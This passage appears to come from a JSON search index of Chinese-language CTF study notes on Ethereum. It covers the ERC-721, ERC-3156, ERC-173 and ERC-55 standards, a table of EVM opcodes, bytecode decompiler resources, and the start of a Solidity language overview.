\u7684\u5b9e\u73b0\uff1aERC721.sol</p> <pre><code>import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\"\n</code></pre> <p>\u800c\u4e14\u4e5f\u5b9e\u73b0\u4e86\u4e00\u4e9b\u6269\u5c55\u3002</p> <p>\u5b83\u5b9e\u73b0\u4e2d\u7684\u4e00\u4e9b\u8bb0\u5f55\u7528\u7684 mapping\uff0c\u53ef\u4ee5\u770b\u51fa\u6574\u4f53\u7ed3\u6784\uff1a <pre><code>// Mapping from token ID to owner address\nmapping(uint256 =&gt; address) private _owners;\n\n// Mapping owner address to token count\nmapping(address =&gt; uint256) private _balances;\n\n// Mapping from token ID to approved address\nmapping(uint256 =&gt; address) private _tokenApprovals;\n\n// Mapping from owner to operator approvals\nmapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;\n</code></pre></p>"},{"location":"ctf/blockchain/eth/erc/#erc-3156","title":"ERC-3156","text":"<p>ERC-3156 \u63d0\u4f9b\u4e86\u4e00\u5957\u95ea\u7535\u8d37\u6807\u51c6\uff0c\u5206\u4e3a\u4e24\u90e8\u5206\uff0clender\uff08\u7ed9\u94b1\u7684\u4eba\uff09\uff0cborrower\uff08\u501f\u94b1\u7684\u4eba\uff09\u3002</p>"},{"location":"ctf/blockchain/eth/erc/#lender","title":"Lender","text":"<p>Lender \u9700\u8981\u5b9e\u73b0\u4e09\u4e2a\u63a5\u53e3</p> <ul> <li>maxFlashLoan\uff1a\u67e5\u8be2\u6700\u5927\u53ef\u8d37\u989d\u5ea6     <pre><code>function maxFlashLoan(address token) external view returns (uint256);\n</code></pre><ul> <li>token \u662f\u8981\u8d37\u7684\u5e01\u79cd\u5408\u7ea6\u5730\u5740</li> <li>\u8fd4\u56de\u503c\u662f\u6700\u5927\u53ef\u8d37\u989d\u5ea6</li> <li>\u4e0d\u53ef\u4ee5\u8d37\u6b3e\u65f6\u8fd4\u56de 0\uff0c\u4e0d\u80fd revert</li> </ul> </li> <li>flashFee\uff1a\u67e5\u8be2\u8d37\u6b3e\u624b\u7eed\u8d39     <pre><code>function flashFee(address token, uint256 amount) external view returns (uint256);\n</code></pre><ul> <li>\u8d37 amount \u4e2a token \u7684\u624b\u7eed\u8d39</li> <li>\u4e0d\u53ef\u4ee5\u8d37\u6b3e\u65f6\u5fc5\u987b revert</li> </ul> </li> <li>flashLoan\uff1a\u6267\u884c\u95ea\u7535\u8d37     <pre><code>function flashLoan(\n    IERC3156FlashBorrower receiver,\n    address token,\n    uint256 amount,\n    bytes calldata data\n) external returns (bool);\n</code></pre><ul> <li>receiver \u662f\u501f\u6b3e\u4eba\uff0c\u5fc5\u987b\u5b9e\u73b0 IERC3156FlashBorrower \u63a5\u53e3</li> <li>flashLoan \u4e2d\u4e00\u5b9a\u8981\u8c03\u7528 receiver \u7684 onFlashLoan \u65b9\u6cd5\uff0c\u4e14\u9a8c\u8bc1\u8fd4\u56de\u503c\uff1a     <pre><code>...\nrequire(receiver.onFlashLoan(msg.sender, token, amount, fee, data) == CALLBACK_SUCCESS, \"ERC3156: Callback failed\");\n...\n</code></pre><ul> <li>\u5176\u4e2d CALLBACK_SUCCESS \u4e3a keccak256(\"ERC3156FlashBorrower.onFlashLoan\")</li> </ul> </li> <li>\u5728\u8c03\u7528 onFlashLoan \u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u8f6c\u79fb amount \u4e2a token \u7ed9 receiver</li> <li>\u5728\u8c03\u7528 onFlashLoan \u65f6\uff0c\u4e0d\u80fd\u4fee\u6539\u4f20\u5165\u7684\u6570\u636e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u662f msg.sender</li> <li>\u5728\u8c03\u7528 onFlashLoan \u4e4b\u540e\uff0c\u5fc5\u987b\u4ece receiver \u8f6c\u79fb amount + fee \u4e2a token \u56de\u6765\u5230\u81ea\u5df1\u8eab\u4e0a\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u5219 revert</li> <li>\u6210\u529f\u540e\u8fd4\u56de true</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#borrower","title":"Borrower","text":"<p>Borrower \u9700\u8981\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3\uff0conFlashLoan\uff0c\u5728\u6536\u5230\u95ea\u7535\u8d37\u540e\uff0c\u4f1a\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\uff0c\u6267\u884c\u540e\u4f1a\u88ab lender \u53d6\u56de\u8d37\u6b3e\u548c\u624b\u7eed\u8d39\u3002\u8fd9\u4e9b\u90fd\u5728\u4e00\u4e2a\u4ea4\u6613\u4e2d\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709 onFlashLoan \u4e2d\u662f\u5f97\u5230\u4e86\u8d37\u6b3e\u7684\u3002</p> <ul> <li>onFlashLoan\uff1a\u6536\u5230\u95ea\u7535\u8d37\u540e callback     <pre><code>function onFlashLoan(\n    address initiator,\n    address token,\n    uint256 amount,\n    uint256 fee,\n    bytes calldata data\n) external returns (bytes32);\n</code></pre><ul> <li>initiator \u662f\u7533\u8bf7\u95ea\u7535\u8d37\u7684\u5730\u5740</li> <li>data \u662f initiator \u4f20\u5165\u7684\u989d\u5916\u4fe1\u606f\uff0c\u53ef\u4ee5\u8fdb\u884c\u7f16\u89e3\u7801</li> <li>\u8fd4\u56de\u4e4b\u524d\u4e00\u5b9a\u8981\u786e\u4fdd approve \u591f\u4e86 amount + fee \u4e2a token \u7ed9 lender \u7528\u6765\u53d6\u56de</li> <li>\u5fc5\u987b\u8fd4\u56de keccak256(\"ERC3156FlashBorrower.onFlashLoan\")</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_13","title":"\u95ea\u7535\u8d37\u6d41\u7a0b","text":""},{"location":"ctf/blockchain/eth/erc/#_14","title":"\u5b9e\u73b0","text":"<p>EIP-3156 \u4e2d\u5c31\u5b9e\u73b0\u4e86 Lender \u548c Borrower \u4f5c\u4e3a\u793a\u4f8b\u3002\u540c\u65f6\u4e5f\u5b9e\u73b0\u4e86 Flash Mint\uff08\u95ea\u7535\u94f8\uff09\u5408\u7ea6\u4f5c\u4e3a\u4f8b\u5b50\u3002</p>"},{"location":"ctf/blockchain/eth/erc/#erc-173","title":"ERC-173","text":"<p>ERC-173 \u63d0\u4f9b\u4e86\u6240\u6709\u6743\u76f8\u5173\u7684\u6807\u51c6\uff0c\u63a5\u53e3\u5f88\u7b80\u5355\uff1a</p> <ul> <li>owner\uff1a\u67e5\u8be2\u6240\u6709\u8005     <pre><code>function owner() external view returns (address);\n</code></pre><ul> <li>\u5f53\u524d\u5408\u7ea6\u7684\u6240\u6709\u8005</li> </ul> </li> <li>transferOwnership\uff1a\u8f6c\u79fb\u6240\u6709\u6743     <pre><code>function transferOwnership(address newOwner) external;\n</code></pre><ul> <li>\u4f1a\u89e6\u53d1 OwnershipTransferred \u4e8b\u4ef6</li> </ul> </li> <li>OwnershipTransferred\uff1a\u6240\u6709\u6743\u8f6c\u79fb\u4e8b\u4ef6     <pre><code>event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_15","title":"\u5b9e\u73b0","text":"<p>OpenZeppelin \u5b9e\u73b0\u4e86\u4e00\u4e2a Ownable.sol\uff0c\u5176\u5305\u542b\u4e86\u8fd9\u4e9b\u63a5\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e9b\u989d\u5916\u7684\u529f\u80fd\uff1a</p> <ul> <li>onlyOwner\uff1a\u4fee\u6539\u5668\uff0c\u9650\u5236\u5f53\u524d\u51fd\u6570\u53ea\u6709\u6240\u6709\u8005\u80fd\u8c03\u7528     <pre><code>modifier onlyOwner() {\n    require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n}\n</code></pre></li> <li>renounceOwnership\uff1a\u653e\u5f03\u6240\u6709\u6743     <pre><code>function renounceOwnership() public virtual onlyOwner {\n    emit OwnershipTransferred(_owner, address(0));\n    _owner = address(0);\n}\n</code></pre><ul> <li>\u5373\u5c06\u6240\u6709\u6743\u8f6c\u79fb\u7ed9 0 \u5730\u5740</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#erc-55","title":"ERC-55","text":"<p>ERC-55 \u662f\u4e00\u4e2a\u5730\u5740\u6821\u9a8c\u6807\u51c6\uff0c\u5229\u7528\u5b57\u6bcd\u7684\u5927\u5c0f\u5199\u6765\u8fdb\u884c\u6821\u9a8c\uff0c\u68c0\u67e5\u5730\u5740\u6709\u6ca1\u6709\u88ab\u65e0\u610f\u6253\u9519\u3002</p> <p>\u751f\u6210\u5e26\u6821\u9a8c\u7684\u5730\u5740\u7684\u65b9\u6cd5\u662f\uff1a</p> <ul> <li>\u5c06\u5730\u5740\u5f53\u4f5c 16 \u8fdb\u5236\u6570</li> <li>\u8ba1\u7b97\u5730\u5740\u7684 keccak256 \u54c8\u5e0c\u503c</li> <li>\u5904\u7406\u5730\u5740\u7684\u6bcf\u4e00\u4f4d i<ul> <li>\u5982\u679c\u7b2c i \u4f4d\u4e0a\u4e3a\u6570\u5b57\uff0c\u5219\u76f4\u63a5\u4fdd\u7559</li> <li>\u68c0\u67e5\u54c8\u5e0c\u503c\u7684\u7b2c 4*i \u4f4d\u662f\u5426\u4e3a 1\uff0c\u5982\u679c\u662f 1 \u5219\u5927\u5199\uff0c\u5426\u5219\u5c0f\u5199</li> </ul> </li> </ul> <pre><code>const createKeccakHash = require('keccak')\n\nfunction toChecksumAddress (address) {\n  address = address.toLowerCase().replace('0x', '')\n  var hash = createKeccakHash('keccak256').update(address).digest('hex')\n  var ret = '0x'\n\n  for (var i = 0; i &lt; address.length; i++) {\n    if (parseInt(hash[i], 16) &gt;= 8) {\n      ret += address[i].toUpperCase()\n    } else {\n      ret += address[i]\n    }\n  }\n\n  return ret\n}\n</code></pre>"},{"location":"ctf/blockchain/eth/evm/","title":"\u4ee5\u592a\u574a\u865a\u62df\u673a","text":"<p> \u7ea6 1681 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u4ee5\u592a\u574a\u7684\u667a\u80fd\u5408\u7ea6\u4f1a\u5728 EVM\uff08Ethereum Virtual Machine\uff0c\u4ee5\u592a\u574a\u865a\u62df\u673a\uff09\u4e0a\u8fd0\u884c\u3002\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd EVM \u7684\u57fa\u7840\u77e5\u8bc6\u3002</p> <p>\u53c2\u8003</p> <ul> <li>Ethereum Virtual Machine (EVM) Opcodes</li> <li>Ethereum Yellow Paper</li> <li>Ethereum Developer Documentation</li> <li>Ethereum EVM Illustrated</li> </ul>"},{"location":"ctf/blockchain/eth/evm/#evm","title":"EVM \u7b80\u4ecb","text":"<p>EVM \u662f\u4e00\u4e2a\u6808\u7ed3\u6784\u7684\u865a\u62df\u673a\uff0c\u6ca1\u6709\u5bc4\u5b58\u5668\uff0c\u6808\u7684\u6df1\u5ea6\u6700\u5927 1024\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f 256 \u4f4d\uff0832 \u5b57\u8282\uff09\u7684\u3002\u540c\u65f6\u5728\u6267\u884c\u671f\u95f4\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u77ac\u65f6\u5185\u5b58\uff08memory\uff09\uff0c\u5176\u6267\u884c\u540e\u4e0d\u4f1a\u6301\u4e45\u5b58\u5728\u3002</p> <p>EVM \u6709\u4e00\u5957\u6307\u4ee4\u96c6\uff0c\u6bcf\u6761\u6307\u4ee4\u90fd\u6709\u4e00\u4e2a 8 \u4f4d\u7684 opcode\uff0c\u6307\u4ee4\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u3001\u6808\u5143\u7d20\u7b49\u3002</p>"},{"location":"ctf/blockchain/eth/evm/#evm_1","title":"EVM \u5b57\u8282\u7801","text":"<p>\u5b8c\u6574\u7684 EVM \u5b57\u8282\u7801\u53ca\u89e3\u91ca\u53ef\u89c1\uff1aethervm.io\uff0c\u8fd9\u91cc\u8fdb\u884c\u4e00\u4e0b\u5206\u7c7b\uff1a</p>"},{"location":"ctf/blockchain/eth/evm/#_2","title":"\u8fd0\u7b97\u6307\u4ee4","text":"<p>\u6ca1\u6709\u7279\u6b8a\u8bf4\u660e\u90fd\u662f\u5728\u6a21 2^256 \u7684\u610f\u4e49\u4e0b\u8fdb\u884c\u8fd0\u7b97\u3002</p> <p>Note</p> <p>\u4e0b\u9762\u8868\u683c\u4e2d\u7684\u6808\u8f93\u5165\u3001\u6808\u8f93\u51fa\u5747\u662f\u5de6\u4fa7\u4e3a\u6808\u9876</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 01 ADD a, b a + b 02 MUL a, b a * b 03 SUB a, b a - b 04 DIV a, b a // b uint256 \u9664\u6cd5 05 SDIV a, b a // b int256 \u9664\u6cd5 06 MOD a, b a % b uint256 \u53d6\u6a21 07 SMOD a, b a % b int256 \u53d6\u6a21 08 ADDMOD a, b, c (a + b) % c 09 MULMOD a, b, c (a * b) % c 0a EXP a, b a ** b 0b SIGNEXTEND b, x signextend(x, b) \u5c06 x \u4ece (b+1)*8 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 256 \u4f4d \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 10 LT a, b a &lt; b 11 GT a, b a &gt; b 12 SLT a, b a &lt; b int256 \u6bd4\u8f83 13 SGT a, b a &gt; b int256 \u6bd4\u8f83 14 EQ a, b a == b 15 ISZERO a a == 0 16 AND a, b a &amp; b 17 OR a, b a | b 18 XOR a, b a ^ b 19 NOT a ~a 1a BYTE i, x x[i] \u53d6 x \u7684\u7b2c i \u4e2a\u5b57\u8282\uff08\u4ece\u9ad8\u4f4d\u7b97\uff09 1b SHL a, b b &lt;&lt; a 1c SHR a, b b &gt;&gt; a \u903b\u8f91\u53f3\u79fb 1d SAR a, b b &gt;&gt; a \u7b97\u6570\u53f3\u79fb \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa 20 SHA3 offset, length keccak256(mem[offset:offset+length])"},{"location":"ctf/blockchain/eth/evm/#_3","title":"\u7279\u6b8a\u6307\u4ee4","text":"<p>\u4e00\u4e9b\u4ee5\u592a\u574a\u7279\u6709\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u53d6\u4e00\u4e9b\u4ea4\u6613\u4fe1\u606f\u3001\u533a\u5757\u4fe1\u606f\u7b49</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 30 ADDRESS address \u5f53\u524d\u5408\u7ea6\u5730\u5740 31 BALANCE addr addr.balance 32 ORIGIN tx.origin 33 CALLER msg.sender 34 CALLVALUE msg.value 35 CALLDATALOAD i msg.data[i:i+32] 36 CALLDATASIZE len(msg.data) 38 CODESIZE len(this.code) 3a GASPRICE tx.gasprice 3b EXTCODESIZE addr len(addr.code) 3d RETURNDATASIZE len(returndata) \u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u8fd4\u56de\u6570\u636e\u957f\u5ea6 3f EXTCODEHASH addr keccak256(addr.code) \u5730\u5740\u4e0d\u5b58\u5728\u5219\u8fd4\u56de 0 40 BLOCKHASH number block.blockHash(blockNumber) 41 COINBASE block.coinbase 42 TIMESTAMP block.timestamp 43 NUMBER block.number 44 DIFFICULTY block.difficulty 45 GASLIMIT block.gaslimit 46 CHAINID chainid 47 SELFBALANCE this.balance 48 BASEFEE block.basefee \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 37 CALLDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = msg.data[dataOffset:dataOffset+length] 39 CODECOPY memOffset, codeOffset, length mem[memOffset:memOffset+length] = this.code[codeOffset:codeOffset+length] 3c EXTCODECOPY addr, memOffset, codeOffset, length mem[memOffset:memOffset+length] = addr.code[codeOffset:codeOffset+length] 3e RETURNDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = returndata[dataOffset:dataOffset+length] \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 58 PC pc \u5f53\u524d\u6307\u4ee4\u7684\u4f4d\u7f6e 59 MSIZE mem.length \u5185\u5b58\u5927\u5c0f 5a GAS gas \u5269\u4f59 gas"},{"location":"ctf/blockchain/eth/evm/#_4","title":"\u5b58\u50a8\u6307\u4ee4","text":"<p>EVM \u6267\u884c\u65f6\u6709\u4e09\u4e2a\u5b58\u50a8\u4f4d\u7f6e\uff1a</p> <ul> <li>\u6808\uff08stack\uff09\uff1a\u901a\u8fc7 PUSH\u3001POP \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u6808\u4e0a\u8fdb\u884c\u8bfb\u5199</li> <li>\u5185\u5b58\uff08memory\uff09\uff1a\u901a\u8fc7 MLOAD\u3001MSTORE \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u5185\u5b58\u4e0a\u8fdb\u884c\u8bfb\u5199</li> <li>\u94fe\u4e0a\u5b58\u50a8\uff08storage\uff09\uff1a\u901a\u8fc7 SLOAD\u3001SSTORE \u7cfb\u5217\u5728\u5f53\u524d\u5408\u7ea6\u7684\u5b58\u50a8\u533a\u8fdb\u884c\u8bfb\u5199\uff08\u662f\u6301\u4e45\u5316\u7684\uff09</li> </ul> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 50 POP a 51 MLOAD offset mem[offset:offset+32] 52 MSTORE offset, value mem[offset:offset+32] = value 53 MSTORE8 offset, value mem[offset] = value 54 SLOAD key storage[key] 55 SSTORE key, value storage[key] = value <p>\u5e76\u4e14\u63d0\u4f9b\u4e86\u5f88\u591a PUSH \u6307\u4ee4\uff0c\u5206\u522b\u5904\u7406\u4e0d\u540c\u5927\u5c0f\u7684\u8f93\u5165\u7acb\u5373\u6570\uff1a</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 60 PUSH1 uint8 \u538b\u5165\u4e00\u4e2a 1 \u5b57\u8282\u7684\u503c 61 PUSH2 uint16 \u538b\u5165\u4e00\u4e2a 2 \u5b57\u8282\u7684\u503c ... ... ... ... ... 7f PUSH32 uint256 \u538b\u5165\u4e00\u4e2a 32 \u5b57\u8282\u7684\u503c <p>\u4ee5\u53ca\u4e00\u4e9b\u6808\u4e0a\u7684\u6570\u636e\u64cd\u4f5c\uff0c\u5373 DUP \u548c SWAP\uff0c\u5206\u522b\u8868\u793a\u590d\u5236\u6808\u4e0a\u67d0\u5904\u6570\u636e\u5230\u6808\u9876\u4ee5\u53ca\u4ea4\u6362\u6808\u4e0a\u4e24\u4e2a\u6570\u636e\uff1a</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 80 DUP1 a a, a \u5c06\u6808\u9876\u6570\u636e\u590d\u5236\u4e00\u4efd\u5230\u6808\u9876 81 DUP2 _, a a, _, a \u590d\u5236\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u5230\u6808\u9876 82 DUP3 _, _, a a, _, _, a \u590d\u5236\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u5230\u6808\u9876 ... ... ... ... ... 8f DUP16 ... ... \u590d\u5236\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u5230\u6808\u9876 90 SWAP1 a, b b, a \u4ea4\u6362\u6808\u9876\u4e24\u4e2a\u6570\u636e 91 SWAP2 a, _, b b, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 2 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e 92 SWAP3 a, _, _, b b, _, _, a \u4ea4\u6362\u6808\u4e0a\u7b2c 3 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e ... ... ... ... ... 9f SWAP16 ... ... \u4ea4\u6362\u6808\u4e0a\u7b2c 16 \u4e2a\u6570\u636e\u548c\u6808\u9876\u6570\u636e"},{"location":"ctf/blockchain/eth/evm/#_5","title":"\u8df3\u8f6c\u6307\u4ee4","text":"<p>EVM \u7684\u8df3\u8f6c\u6bd4\u8f83\u7279\u522b\uff0c\u5b83\u4e0d\u80fd\u968f\u610f\u8df3\u8f6c\u5230\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ea\u80fd\u8df3\u8f6c\u5230\u4e00\u4e2a JUMPDEST \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 56 JUMP dest \u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 57 JUMPI dest, cond \u5982\u679c cond \u975e 0 \u5219\u8df3\u8f6c\u5230 dest \u4f4d\u7f6e 5b JUMPDEST \u6807\u8bb0\u4e00\u4e2a\u8df3\u8f6c\u76ee\u6807"},{"location":"ctf/blockchain/eth/evm/#_6","title":"\u65e5\u5fd7\u6307\u4ee4","text":"<p>\u5728\u94fe\u4e0a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4e5f\u5c31\u662f event\u3002</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 a0 LOG0 offset, length LOG0(mem[offset:offset+length]) a1 LOG1 offset, length, topic0 LOG1(mem[offset:offset+length], topic0) ... ... ... ... a4 LOG4 offset, length, topic0~3 LOG4(mem[offset:offset+length], topic0~3)"},{"location":"ctf/blockchain/eth/evm/#_7","title":"\u521b\u5efa\u5408\u7ea6\u5730\u5740\u6307\u4ee4","text":"<p>\u521b\u5efa\u5408\u7ea6\u5730\u5740\u6709\u4e24\u79cd\u6307\u4ee4\uff0cCREATE \u548c CREATE2\uff0c\u540e\u8005\u662f\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\u5f15\u5165\u7684\u3002</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 f0 CREATE value, offset, length address f5 CREATE2 value, offset, length, salt address"},{"location":"ctf/blockchain/eth/evm/#_8","title":"\u8c03\u7528\u3001\u8fd4\u56de\u3001\u81ea\u6bc1\u6307\u4ee4","text":""},{"location":"ctf/blockchain/eth/evm/#_9","title":"\u8fdc\u7a0b\u8c03\u7528\u6307\u4ee4","text":"<p>EVM \u4e2d\u8fdc\u7a0b\u8c03\u7528\u6709\u56db\u79cd\uff1a</p> <ul> <li>call\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u88ab\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001</li> <li>callcode\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001\uff08\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u7531 delegatecall \u53d6\u4ee3\uff09</li> <li>delegatecall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u5982\u679c\u6709\u72b6\u6001\u4fee\u6539\uff0c\u4fee\u6539\u7684\u662f\u8c03\u7528\u5408\u7ea6\u7684\u72b6\u6001</li> <li>staticcall\uff1a\u8fdc\u7a0b\u8c03\u7528\uff0c\u4e0d\u80fd\u5b58\u5728\u72b6\u6001\u4fee\u6539</li> </ul> <p>\u5176\u4e2d callcode \u548c delegatecall \u7684\u533a\u522b\u662f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u8c03\u7528\uff1aAlice \u901a\u8fc7\u4ea4\u6613\u8c03\u7528\u4e86\u5408\u7ea6 A\uff0c\u5408\u7ea6 A \u4e2d\u901a\u8fc7\u67d0\u4e00\u8fdc\u7a0b\u8c03\u7528\u8c03\u7528\u4e86\u5408\u7ea6 B\uff0c\u90a3\u4e48\uff1a</p> <ul> <li>callcode\uff1a\u5408\u7ea6 A \u4e2d\u7684 msg.sender \u662f Alice\uff0c\u5408\u7ea6 B \u4e2d\u7684 msg.sender \u662f A</li> <li>delegatecall\uff1a\u5408\u7ea6 A \u548c B \u4e2d\u7684 msg.sender \u90fd\u662f Alice</li> </ul> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa f1 CALL gas, to, value, argsOffset, argsLength, retOffset, retLength success f2 CALLCODE gas, to, value, argsOffset, argsLength, retOffset, retLength success f4 DELEGATECALL gas, to, argsOffset, argsLength, retOffset, retLength success fa STATICCALL gas, to, argsOffset, argsLength, retOffset, retLength success"},{"location":"ctf/blockchain/eth/evm/#_10","title":"\u8fd4\u56de\u6307\u4ee4","text":"<p>\u8fd4\u56de\u6307\u4ee4\u4e5f\u53ef\u4ee5\u7b97\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f RETURN \u6b63\u5e38\u8fd4\u56de\uff0c\u53e6\u4e00\u79cd\u662f REVERT \u5f02\u5e38\u56de\u6eda\uff08\u540c\u65f6 REVERT \u4f1a\u56de\u6eda\u6240\u6709\u7684\u72b6\u6001\u4fee\u6539\uff09\u3002</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 f3 RETURN offset, length return mem[offset:offset+length] fd REVERT offset, length revert mem[offset:offset+length]"},{"location":"ctf/blockchain/eth/evm/#_11","title":"\u81ea\u6bc1\u6307\u4ee4","text":"<p>\u81ea\u6bc1\u5373 solidity \u4ee3\u7801\u4e2d\u7684 selfdestruct\uff0c\u9500\u6bc1\u5f53\u524d\u5408\u7ea6\uff0c\u5e76\u5c06\u6240\u6709\u4f59\u989d\u8f6c\u79fb\u5230\u6307\u5b9a\u5730\u5740\u3002</p> \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 ff SELFDESTRUCT address selfdestruct(address)"},{"location":"ctf/blockchain/eth/evm/#evm_2","title":"EVM \u9006\u5411","text":"<p>\u6709\u65f6\u9898\u76ee\u4e0d\u4f1a\u7ed9\u51fa\u5408\u7ea6\u6e90\u7801\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u9006\u5411\u3002\u4e00\u4e9b\u5e38\u7528\u7684\u7f51\u7ad9\uff1a</p> <ul> <li>ethervm.io/decompile</li> <li>dedaube Contract Library</li> <li>etherscan</li> <li>Binary Ninja \u7684\u63d2\u4ef6  crytic/ethersplay</li> <li>etherscan \u4e0a\u4e5f\u662f\u6709\u9006\u5411\u529f\u80fd\u7684</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/","title":"Solidity \u8bed\u8a00","text":"<p> \u7ea6 7346 \u4e2a\u5b57  361 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 29 \u5206\u949f</p> <p>Abstract</p> <p>Solidity \u662f\u4e00\u95e8\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u7684\u8bed\u8a00\uff0c\u662f\u4ee5\u592a\u574a\u7684\u5b98\u65b9\u8bed\u8a00\u3002</p> <p>\u5b98\u65b9\u6587\u6863\uff1adocs.soliditylang.org</p>"},{"location":"ctf/blockchain/eth/solidity/#_1","title":"\u6574\u4f53\u7ed3\u6784","text":""},{"location":"ctf/blockchain/eth/solidity/#_2","title":"\u6e90\u6587\u4ef6\u7ed3\u6784","text":"<ul> <li>\u6269\u5c55\u540d <code>.sol</code></li> <li>\u7b2c\u4e00\u884c\u662f <code>// SPDX-License-Identifier: &lt;SPDX-License-Identifier&gt;</code>\uff0c\u7528\u4e8e\u58f0\u660e\u8bb8\u53ef\u8bc1<ul> <li>\u4e0d\u58f0\u660e\u8bb8\u53ef\u8bc1\u7684\u8bdd\u8981\u5199 UNLICENSED\uff0c\u4e0d\u7136\u4f1a\u8b66\u544a</li> </ul> </li> <li>\u63a5\u4e0b\u6765\u662f pragma \u8bed\u53e5<ul> <li>\u6307\u5b9a\u7248\u672c\uff1a<code>pragma solidity ^0.8.0;</code></li> <li>\u6307\u5b9a ABI \u7f16\u89e3\u7801\u5668\u7248\u672c\uff1a<code>pragma abicoder v2;</code><ul> <li>0.8.0 \u4e4b\u540e\u9ed8\u8ba4\u4f7f\u7528 v2 \u7248\u672c</li> </ul> </li> </ul> </li> <li>\u63a5\u4e0b\u6765\u662f import \u8bed\u53e5     <pre><code>import \"filename\";\nimport * as symbolName from \"filename\";\nimport \"filename\" as symbolName;\nimport {symbol1 as alias, symbol2} from \"filename\";\n</code></pre></li> <li>\u540e\u9762\u5c31\u662f\u5408\u7ea6\u5185\u5bb9\u4e86<ul> <li>\u6ce8\u91ca\u4f7f\u7528 <code>//</code> \u548c <code>/* */</code>\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>///</code> \u548c <code>/** */</code> \u4f5c\u4e3a\u6587\u6863\u6ce8\u91ca</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_3","title":"\u5408\u7ea6\u7ed3\u6784","text":"<ul> <li>\u4f7f\u7528 contract \u5173\u952e\u5b57\u58f0\u660e\u5408\u7ea6     <pre><code>contract 